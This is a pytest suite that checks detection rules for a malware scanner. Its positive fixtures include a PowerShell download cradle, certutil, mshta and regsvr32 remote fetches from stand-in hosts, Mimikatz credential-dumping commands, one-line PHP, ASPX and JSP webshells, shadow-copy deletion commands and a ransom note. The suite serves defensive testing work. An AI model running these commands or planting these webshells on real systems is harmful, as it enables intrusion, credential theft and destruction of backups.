"""Validation for the shipped detection content (rules/*.yar).

Every rule family must fire on its synthetic positive fixture and must NOT
fire on the benign corpus. This is the false-positive gate: if a new rule
breaks either direction, this suite fails and the feed does not ship.
"""

from __future__ import annotations

import gzip
import io
import os
import zipfile

import pytest

from conftest import build_minimal_elf, build_minimal_pe
from aegorx.engine import ScanEngine


@pytest.fixture(scope="module")
def engine():
    import tempfile

    old = os.environ.get("AEGORX_HOME")
    os.environ["AEGORX_HOME"] = tempfile.mkdtemp(prefix="aegorx-detect-")
    try:
        yield ScanEngine(enable_ml=False)
    finally:
        if old is None:
            os.environ.pop("AEGORX_HOME", None)
        else:
            os.environ["AEGORX_HOME"] = old


def _scan(tmp_path, name, data, engine):
    path = tmp_path / name
    if isinstance(data, str):
        data = data.encode("utf-8")
    path.write_bytes(data)
    return engine.scan_file(str(path))


def _names(result):
    return {d.name for d in result.detections}


# --- positives ---------------------------------------------------------------

CRADLE = (
    "powershell -nop -w hidden -c "
    "\"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')\""
)


def test_powershell_cradle_detected(engine, tmp_path):
    result = _scan(tmp_path, "run.ps1", CRADLE, engine)
    assert "Suspicious_PowerShell_Cradle" in _names(result)
    assert result.verdict == "malicious"


def test_encoded_cradle_detected(engine, tmp_path):
    blob = "A" * 64
    result = _scan(tmp_path, "enc.cmd", f"powershell -noprofile -enc {blob}", engine)
    assert "Suspicious_PowerShell_Cradle" in _names(result)


def test_certutil_fetch_detected(engine, tmp_path):
    result = _scan(
        tmp_path,
        "get.bat",
        "certutil -urlcache -split -f https://evil.example/payload.exe %TEMP%\\p.exe",
        engine,
    )
    assert "Suspicious_Certutil_Download" in _names(result)


def test_mshta_remote_detected(engine, tmp_path):
    result = _scan(tmp_path, "open.hta", 'mshta.exe "http://203.0.113.9/x.hta"', engine)
    assert "Suspicious_Mshta_Remote" in _names(result)


def test_regsvr32_squiblydoo_detected(engine, tmp_path):
    result = _scan(
        tmp_path,
        "load.bat",
        "regsvr32 /u /n /s /i:http://203.0.113.9/scrobj.sct scrobj.dll",
        engine,
    )
    assert "Suspicious_Regsvr32_Remote" in _names(result)


def test_mimikatz_markers_detected(engine, tmp_path):
    result = _scan(
        tmp_path,
        "notes.txt",
        "standard privilege::debug then sekurlsa::logonpasswords then lsadump::dcsync /corp.local",
        engine,
    )
    assert "Generic_Mimikatz_Credential_Dumper" in _names(result)
    assert result.verdict == "malicious"


def test_lsass_dump_tooling_detected(engine, tmp_path):
    pe = build_minimal_pe() + b"lsass\x00MiniDumpWriteDump\x00"
    result = _scan(tmp_path, "dumper.exe", pe, engine)
    assert "Suspicious_Lsass_Dump_Tooling" in _names(result)


def test_injection_trio_detected(engine, tmp_path):
    pe = build_minimal_pe() + b"\x00VirtualAlloc\x00WriteProcessMemory\x00CreateRemoteThread\x00"
    result = _scan(tmp_path, "injector.bin", pe, engine)
    assert "Suspicious_Process_Injection_API_Trio" in _names(result)


def test_php_webshell_detected(engine, tmp_path):
    result = _scan(tmp_path, "wp-cache.php", "<?php eval($_POST['cmd']); ?>", engine)
    assert "PHP_Webshell_Request_Eval" in _names(result)


def test_aspx_webshell_detected(engine, tmp_path):
    result = _scan(tmp_path, "health.aspx", '<%@ Page Language="C#" %>\\n<% eval(Request["c"]); %>', engine)
    assert "ASPX_Webshell_Request_Eval" in _names(result)


def test_jsp_webshell_detected(engine, tmp_path):
    src = 'String c = request.getParameter("cmd");\nRuntime.getRuntime().exec(c);'
    result = _scan(tmp_path, "status.jsp", src, engine)
    assert "JSP_Webshell_Runtime_Exec" in _names(result)


def test_ransom_note_language_detected(engine, tmp_path):
    note = (
        "WARNING! All your files have been encrypted. "
        "Send 0.15 btc to our bitcoin wallet address to restore your files."
    )
    result = _scan(tmp_path, "README_RECOVER.txt", note, engine)
    assert "Ransom_Extortion_Note_Language" in _names(result)


def test_shadow_copy_sabotage_detected(engine, tmp_path):
    bat = (
        "@echo off\n"
        "vssadmin.exe delete shadows /all /quiet\n"
        "bcdedit.exe /set {default} recoveryenabled no\n"
    )
    result = _scan(tmp_path, "stage2.bat", bat, engine)
    assert "Ransom_Shadow_Copy_Sabotage" in _names(result)


def test_vbs_dropper_obfuscation_detected(engine, tmp_path):
    vbs = (
        "Set sh = CreateObject(\"WScript.Shell\")\n"
        "s = Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)\n"
        "Execute(s)\n"
        "Set st = CreateObject(\"ADODB.Stream\")\n"
    )
    result = _scan(tmp_path, "invoice.vbs", vbs, engine)
    assert "Suspicious_VBS_JS_Obfuscated_Dropper" in _names(result)


def test_upx_marker_informational_only(engine, tmp_path):
    pe = build_minimal_pe().replace(b".text\x00", b"UPX0\x00") + b"UPX!UPX!UPX!"
    result = _scan(tmp_path, "tool.exe", pe, engine)
    names = _names(result)
    assert "Info_PE_UPX_Packed" in names
    assert result.verdict == "clean", "packer marker alone must not change the verdict"


# --- containers keep working through the new rules ---------------------------


def test_cradle_inside_gzip_detected(engine, tmp_path):
    path = str(tmp_path / "job.log.gz")
    with gzip.open(path, "wb") as fh:
        fh.write(CRADLE.encode())
    result = engine.scan_file(path)
    assert "Suspicious_PowerShell_Cradle" in _names(result)


# --- benign corpus: no false positives allowed --------------------------------


@pytest.mark.parametrize(
    "name,data",
    [
        ("readme.md", "# Project\nInstall with pip. Contact admin@example.com.\n" * 30),
        ("report.xlsx.txt", "Quarterly numbers look fine. Budget approved.\n" * 50),
        ("native_elf.bin", build_minimal_elf()),
        ("plain_pe.bin", build_minimal_pe()),
        ("archive.zip", None),  # filled in below
        ("backup.vbs", "MsgBox \"Backup finished successfully\"\n"),
        ("deploy.bat", "robocopy \\\\fileserver\\share D:\\mirror /MIR\n"),
        ("script.ps1", "Get-ChildItem C:\\Logs -Filter *.log | Sort-Object Length\n"),
        ("notes.html", "<html><body><h1>Notes</h1><p>mshta is a Windows binary</p></body></html>"),
    ],
)
def test_benign_corpus_stays_clean(engine, tmp_path, name, data):
    if data is None:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("a.txt", "hello world\n" * 10)
            zf.writestr("b/c.csv", "id,value\n1,2\n")
        data = buf.getvalue()
    result = _scan(tmp_path, name, data, engine)
    threat_names = {
        n
        for n in _names(result)
        if not n.startswith("Document.") and n != "Archive.NestedTooDeep"
    }
    assert threat_names == set(), f"{name} flagged: {threat_names}"
